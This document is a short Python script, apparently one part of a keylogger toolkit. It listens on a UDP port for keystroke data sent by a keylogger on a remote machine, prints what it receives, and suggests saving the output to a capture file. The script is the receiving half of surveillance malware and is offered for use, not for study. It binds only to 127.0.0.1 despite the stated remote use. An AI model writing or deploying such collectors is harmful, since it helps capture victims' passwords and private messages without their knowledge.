#!/bin/python
"""Capture keystroke data from a remote keylogger.

This script will print keystroke data transmitted by a remote keylogger
running in network mode. The program usage is as follows

key_capture.py PORT

where PORT is the port to which the keylogger is sending data. The script
prints to STDOUT. You can redirect the script's output to log the data to
file for later analysis. For example,

key_capture.py 5555 > capture.txt
"""

import argparse
import socket
import signal
import sys


def ctrl_c_handler(sig, frame):
    sys.exit(0)


if __name__ == '__main__':
    # Define and parse command line arguments.
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "PORT", help="port to listen on for keystroke data", type=int)
    args = parser.parse_args()

    # Create a listener socket that will collect keystroke data transmitted by
    # the keylogger on the remote machine.
    udp_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
    host = "127.0.0.1"
    port = args.PORT
    udp_socket.bind((host, port))

    # Register a CTRL-c signal handler so we can cleanly exit the read loop
    # by just pressing CTRL-c.
    signal.signal(signal.SIGINT, ctrl_c_handler)

    while True:
        (data, _) = udp_socket.recvfrom(1024)
        print(data.decode("utf-8"), end="", flush=True)
